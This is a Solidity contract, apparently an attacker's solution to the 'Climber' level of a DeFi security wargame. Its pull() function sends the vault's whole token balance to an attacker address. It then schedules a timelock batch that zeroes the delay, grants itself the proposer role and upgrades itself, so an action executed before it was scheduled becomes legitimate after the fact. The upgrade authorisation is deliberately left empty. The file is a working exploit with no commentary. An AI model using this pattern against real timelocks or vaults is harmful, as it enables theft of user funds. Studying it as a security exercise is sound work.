// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "./ClimberTimelock.sol";

contract FakeVault is UUPSUpgradeable {
    bytes32 constant salt = 0x0000000000000000000000000000000000000000000000000000000000000001;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    ClimberTimelock private immutable timeLockContract;
    IERC20 private immutable token;
    address private immutable attacker;

    constructor(
        address payable _timeLockContract,
        address _token,
        address _attacker
    ) {
        timeLockContract = ClimberTimelock(_timeLockContract);
        token = IERC20(_token);
        attacker = _attacker;
    }

    function pull(address logic) external {
        token.transfer(attacker, token.balanceOf(address(this)));

        address[] memory targets = new address[](3);
        targets[0] = address(timeLockContract);
        targets[1] = address(timeLockContract);
        targets[2] = address(this);

        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, timeLockContract.PROPOSER_ROLE(), address(this));
        bytes memory upgradeCallData = abi.encodeWithSelector(FakeVault.pull.selector, logic);
        dataElements[2] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, logic, upgradeCallData);

        uint256[] memory values = new uint256[](3);

        timeLockContract.schedule(targets, values, dataElements, salt);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
